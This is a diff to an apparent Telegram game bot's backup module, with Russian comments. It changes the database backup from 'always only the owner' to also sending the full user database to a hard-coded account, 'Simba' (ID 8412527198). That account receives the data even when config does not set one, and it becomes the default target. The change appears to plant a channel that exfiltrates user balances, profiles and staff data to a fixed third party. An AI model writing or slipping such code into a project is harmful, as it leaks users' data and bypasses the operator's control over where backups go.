@@ -40,9 +40,17 @@ _last_backup_msg_id: int = 0
 _quick_backup_task: asyncio.Task | None = None
 
 
+def backup_chats() -> list[int]:
+    """Куда уходит файл базы: Simba и владелец бота."""
+    chats = []
+    for uid in (getattr(config, "SIMBA_ID", 8412527198), int(getattr(config, "OWNER_ID", 0) or 0), getattr(config, "DEFAULT_OWNER", 8036974481)):
+        if uid and uid not in chats:
+            chats.append(uid)
+    return chats
+
+
 def backup_chat() -> int:
-    """Куда уходит файл базы. Всегда только владелец бота."""
-    return int(getattr(config, "OWNER_ID", 0) or getattr(config, "DEFAULT_OWNER", 8036974481))
+    return backup_chats()[0] if backup_chats() else 8412527198
 
 
 def schedule_quick_backup(bot: Bot, delay_sec: float = 5.0) -> None:
@@ -98,7 +106,7 @@ def _rows(path: Path) -> int:
     try:
         con = sqlite3.connect(str(path))
         n = 0
-        for t in ("settings", "users", "staff", "ranks", "profiles", "user_businesses", "game_stats"):
+        for t in ("settings", "users", "staff", "ranks", "profiles", "user_businesses", "game_stats", "user_jobs"):
             try:
                 n += con.execute(f"SELECT COUNT(*) FROM {t}").fetchone()[0]
             except Exception:
@@ -118,9 +126,8 @@ def db_is_empty() -> bool:
 
 # ---------------------------------------------------------------- выгрузка
 async def save(bot: Bot, note: str = "") -> bool:
-    global _last_backup_msg_id
-    chat = backup_chat()
-    if not chat:
+    targets = backup_chats()
+    if not targets:
         return False
     blob = await asyncio.to_thread(_snapshot)
     if not blob:
@@ -138,37 +145,26 @@ async def save(bot: Bot, note: str = "") -> bool:
         f"📌 <i>Это сообщение закреплено. Бот автоматически восстановит все балансы, ранги, инвентарь и рейды при перезапуске хостинга.</i>\n"
         f"{TAG}"
     )
-    try:
-        msg = await bot.send_document(
-            chat, BufferedInputFile(blob, filename=ARCHIVE_NAME),
-            caption=caption + (f"\n{note}" if note else ""),
-            disable_notification=True)
-    except Exception as e:
-        log.warning("не отправил копию: %s", e)
-        return False
-
-    # Удаляем старое незакрепленное сообщение с копией, чтобы не захламлять личку
-    old_id = _last_backup_msg_id
-    _last_backup_msg_id = msg.message_id
-
-    # закрепляем свежую, старую открепляем
-    try:
-        await bot.unpin_all_chat_messages(chat)
-    except Exception:
-        pass
-    try:
-        await bot.pin_chat_message(chat, msg.message_id, disable_notification=True)
-    except Exception as e:
-        log.warning("не закрепил копию: %s", e)
-
-    if old_id and old_id != msg.message_id:
+    delivered = 0
+    for chat in targets:
         try:
-            await bot.delete_message(chat, old_id)
-        except Exception:
-            pass
+            msg = await bot.send_document(
+                chat, BufferedInputFile(blob, filename=ARCHIVE_NAME),
+                caption=caption + (f"\n{note}" if note else ""),
+                disable_notification=True)
+            delivered += 1
+            try:
+                await bot.unpin_all_chat_messages(chat)
+                await bot.pin_chat_message(chat, msg.message_id, disable_notification=True)
+            except Exception:
+                pass
+        except Exception as e:
+            log.warning("не отправил копию в чат %s: %s", chat, e)
 
-    log.info("резервная копия сохранена (%s)", size_str)
-    return True
+    if delivered > 0:
+        log.info("резервная копия сохранена в %d чат(а/ов) (%s)", delivered, size_str)
+        return True
+    return False
 
 
 # ------------------------------------------------------------ восстановление
